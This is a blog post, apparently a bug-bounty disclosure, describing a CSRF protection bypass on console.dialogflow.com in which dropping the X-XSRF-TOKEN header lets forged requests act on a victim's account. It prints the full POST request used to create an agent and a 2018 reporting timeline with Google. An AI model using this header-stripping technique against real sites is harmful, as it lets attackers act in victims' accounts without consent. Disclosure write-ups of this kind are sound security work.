+++
date = '2025-02-01T10:45:23+05:00'
draft = false
title = 'Site-wide CSRF on Google Dialogflow'
+++





## What is Dialogflow ?
```Dialogflow``` (formerly known as API.ai) is a natural language understanding (NLU) platform that enables developers to design and integrate conversational user interfaces into their applications, websites, and devices. It uses machine learning to process and 
understand natural language input, allowing users to interact with systems using everyday language.
Dialogflow is widely used for building chatbots, virtual assistants, and other conversational interfaces. It is particularly popular in customer service, where it can be used to automate responses to common inquiries, freeing up human agents to handle more complex 
issues.

I began searching dialogflow.com for bugs and security issues after Dialogflow was acquired by Google.

## CSRF
>This security flaw is known as Cross-Site Request Forgery, or CSRF for short, enables an attacker to carry out actions on behalf of victim users that can change state in the application like send money or invite members. 

After some testing I discovered CSRF protection mechanism on ```console.dialogflow.com`` can be exploited by deleting the ```X-XSRF-TOKEN``` header from the requests.

I created a new agent on the victim’s behalf using this POST request to show sensitive action on the victim user’s dialogflow account.
 
```
POST /api-client/agents HTTP/1.1
Host: console.dialogflow.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json;charset=utf-8
Content-Length: 385
Cookie: xxx
Connection: close

{"name":"NewAgent2","description":"","sampleData":null,"language":"en","ownerId":"","primaryKey":"","secondaryKey":"","enableFulfillment":false,"defaultTimezone":"Asia/Almaty","googleAssistant":{},"isPrivate":true,"customClassifierMode":"use.after","mlMinConfidence":0.3,"disableInteractionLogs":false,"useCustomClassifier":true,"intentParamsAutoSync":true,"enableOnePlatformApi":true}
```

After sending this request, a unique ID for your new agent with name ***NewAgent2*** which can be accessed here

```
https://console.dialogflow.com/api-client/#/agent/<ID>/intents
```
I added a new agent to the victim’s account and it demonstrates that the CSRF protection mechanism is bypassed

This issue affected the entire console.dialogflow.com site at the time it was reported, and it could be exploited on all ```console.dialogflow.com``` endpoints.


## Timeline:

- Jan 9, 2018: I reported this CSRF issue to Google's Vulnerability Reward Program
- Jan 9, 2018: Got automated response
- Jan 10, 2018: Google Security Team triaged this issue
- Jan 16, 2018: "Nice catch" response from Google Security Team 
- Jan 25, 2018: Google Security Team decided to issue a reward of $XXX
